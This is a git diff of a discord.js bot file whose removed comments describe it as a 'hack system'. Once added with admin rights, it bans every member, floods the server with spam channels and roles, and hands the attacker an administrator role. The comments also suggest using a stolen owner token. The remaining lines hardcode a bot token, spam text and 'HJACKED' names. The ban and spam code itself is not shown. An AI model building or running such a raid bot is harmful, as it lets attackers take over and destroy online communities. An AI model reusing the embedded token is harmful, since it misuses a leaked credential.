@@ -1,29 +1,19 @@
-//فكره الكود
-//ان تسوي بوت 
-//وتعطيه اداري يضيفه
-//لما يضيفه تكتب الامر يلي انت حددته
-//وبيسوي رتب باسم يلي انت تحدده
-//ورومات صوتيه وكتابيه بالاسم يلي تحدده
-//ويعطيك رتبه فيها ادمن ستريشن
-//وتتحكم في السيرفر 
-//طبعا اول ما تكتب الامر بيبند كل الاعضاء 
-//او
-// اذا معك توكن الاونر حط توكن الاونر
-//ENJOY
-//Sorry For The Bad Engilsh :/
-const Discord = require("discord.js") //npm i discord.js
+
+const Discord = require("discord.js")
 const client = new Discord.Client();
-const Token = 'NTM1NTgwODQxMzgwOTM3NzI5.D0L3Sg.tdCJ9PsgWWiy0sathm_9e6_9VPw' //حط توكن بوتك هنا // your bot token
-const x_x = "!" //الامر يلي يشغل الكود //the command to start the hack system
-const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
-const teext = "Hacker by bk7" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
-const vooice = "Hacker by bk7" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
-const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
-const spam = "Hacker bk7" // الكلام يلي بيسوي فيه سبام البوت //the spam message
-const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
-const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
-const role = 'bk7' // اسم الرتبه يلي بيسويها //the role name
-const adminstrator = 'TM:by bk7' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
+
+const Token = 'NTM1NTgwODQxMzgwOTM3NzI5.D0L3Sg.tdCJ9PsgWWiy0sathm_9e6_9VPw'
+const x_x = "!"
+const opcmd = 'oprole'
+const teext = "Hacker by bk7"
+const vooice = "Hacker by bk7"
+const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png"
+const spam = "Hacker bk7"
+const namee = "HJACKED"
+const playing = "HJACKED 1 SERVER"
+const role = 'bk7'
+const adminstrator = 'TM:by bk7'
+
 console.log('BY OROCHIX');
 console.log('Start Hacking System ..')
 client.on('ready', () => {
@@ -34,11 +24,11 @@ client.on('ready', () => {
 client.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
+console.log('      ~            ~  By : OROCHIX ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
-//BY OROCHIX (Arabic)
+
         
 
 });
